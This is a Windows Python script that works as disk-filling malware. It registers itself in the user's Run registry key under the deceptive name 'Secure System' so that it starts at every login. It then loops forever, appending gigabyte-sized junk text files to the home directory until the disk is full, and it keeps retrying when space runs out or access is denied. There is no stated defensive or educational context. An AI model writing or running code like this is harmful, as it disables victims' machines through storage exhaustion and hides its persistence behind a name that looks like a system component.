import os, webbrowser , ctypes,random,winreg,sys,time
namer = 'data'+str(random.randint(1,999999999999))+'.txt'
script_path = os.path.abspath(sys.argv[0])
key = winreg.OpenKey(
    winreg.HKEY_CURRENT_USER,
    r"Software\Microsoft\Windows\CurrentVersion\Run",
    0,
    winreg.KEY_SET_VALUE
)

winreg.SetValueEx(key, "Secure System", 0, winreg.REG_SZ, script_path)
winreg.CloseKey(key)
i = 0
print('Process started!')
name = os.path.join(os.path.expanduser("~"), namer)

with open(name, "w") as file:
    file.write("aw")
def crash():
    global name
    while True:
        try:
            file = open(name, 'a+')
            file.write('aaaaaa....'*107374000+str(random.randint(10,99)))
            file.close
        except OSError as e:
            if e.errno == 28:
                file.close()
                print("space left. waiting")
                time.sleep(10)
            elif e.errno == 13:
                name = 'data'+str(random.randint(1,999999999999))+'.txt'
            else:
                time.sleep(10)
crash()
